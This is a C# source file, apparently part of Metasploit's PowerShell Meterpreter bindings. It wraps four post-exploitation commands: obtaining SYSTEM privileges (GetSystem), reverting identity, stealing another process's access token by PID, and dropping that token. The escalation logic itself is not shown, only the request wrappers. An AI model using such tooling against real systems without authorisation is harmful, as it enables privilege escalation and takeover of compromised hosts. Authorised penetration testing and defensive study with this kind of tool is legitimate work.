using System;
using System.Collections.Generic;
using System.Text;

namespace MSF.Powershell.Meterpreter
{
    public static class Elevate
    {
        public static bool GetSystem()
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call GetSystem");

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.ElevateTechnique, 1);
            tlv.Pack(TlvType.ElevateServiceName, "abcd1234");

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.PrivElevateGetsystem));

            if (result != null)
            {
                var responseTlv = Tlv.FromResponse(result);
                return responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0;
            }

            return false;
        }

        public static bool Rev2Self()
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call Rev2Self");

            Tlv tlv = new Tlv();

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.StdapiSysConfigRev2self));

            if (result != null)
            {
                var responseTlv = Tlv.FromResponse(result);
                return responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0;
            }

            return false;
        }

        public static bool StealToken(int pid)
        {
            System.Diagnostics.Debug.Write(string.Format("[PSH BINDING] Invoking binding call StealToken({0})", pid));

            Tlv tlv = new Tlv();
            tlv.Pack(TlvType.Pid, pid);

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.StdapiSysConfigStealToken));

            if (result != null)
            {
                var responseTlv = Tlv.FromResponse(result);
                return responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0;
            }

            return false;
        }

        public static bool DropToken()
        {
            System.Diagnostics.Debug.Write("[PSH BINDING] Invoking binding call DropToken");

            Tlv tlv = new Tlv();

            var result = Core.InvokeMeterpreterBinding(true, tlv.ToRequest(CommandId.StdapiSysConfigDropToken));

            if (result != null)
            {
                var responseTlv = Tlv.FromResponse(result);
                return responseTlv[TlvType.Result].Count > 0 &&
                    (int)responseTlv[TlvType.Result][0] == 0;
            }

            return false;
        }
    }
}
